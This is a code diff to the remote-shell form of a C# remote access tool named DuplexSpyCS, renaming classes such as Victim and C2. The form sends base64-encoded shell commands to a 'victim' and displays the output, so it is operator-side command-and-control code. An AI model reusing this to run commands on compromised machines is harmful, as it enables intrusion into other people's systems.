@@ -13,7 +13,7 @@ namespace DuplexSpyCS
 {
     public partial class frmShell : Form
     {
-        public Victim v;
+        public clsVictim v;
         private int idx_cmdPrompt;
         private int idx_previous_sel;
 
@@ -38,7 +38,7 @@ namespace DuplexSpyCS
         {
             Invoke(new Action(() =>
             {
-                richTextBox1.AppendText(Crypto.b64D2Str(output));
+                richTextBox1.AppendText(clsCrypto.b64D2Str(output));
                 idx_cmdPrompt = richTextBox1.Text.Length;
                 richTextBox1.SelectionStart = idx_cmdPrompt;
                 richTextBox1.ScrollToCaret();
@@ -58,15 +58,15 @@ namespace DuplexSpyCS
         //Send cmd command
         private void ExecCmd(string cmd)
         {
-            v.SendCommand($"shell|cmd|{Crypto.b64E2Str(cmd)}");
+            v.SendCommand($"shell|cmd|{clsCrypto.b64E2Str(cmd)}");
         }
 
         void setup()
         {
-            string exec = C2.ini_manager.Read("Shell", "exec");
+            string exec = clsStore.ini_manager.Read("Shell", "exec");
             textBox1.Text = exec;
             richTextBox1.ReadOnly = true;
-            v.SendCommand($"shell|start|{Crypto.b64E2Str(exec)}|{Crypto.b64E2Str(init_path)}");
+            v.SendCommand($"shell|start|{clsCrypto.b64E2Str(exec)}|{clsCrypto.b64E2Str(init_path)}");
         }
 
         private void frmShell_Load(object sender, EventArgs e)
@@ -132,14 +132,14 @@ namespace DuplexSpyCS
         //Start exec
         private void button1_Click(object sender, EventArgs e)
         {
-            v.SendCommand($"shell|start|{Crypto.b64E2Str(textBox1.Text)}|{Crypto.b64E2Str(".")}");
+            v.SendCommand($"shell|start|{clsCrypto.b64E2Str(textBox1.Text)}|{clsCrypto.b64E2Str(".")}");
         }
 
         //Save output
         private void toolStripMenuItem1_Click(object sender, EventArgs e)
         {
             SaveFileDialog sfd = new SaveFileDialog();
-            sfd.FileName = "output_" + C1.GenerateFileName("txt");
+            sfd.FileName = "output_" + clsTools.GenerateFileName("txt");
             if (sfd.ShowDialog() == DialogResult.OK)
             {
                 try
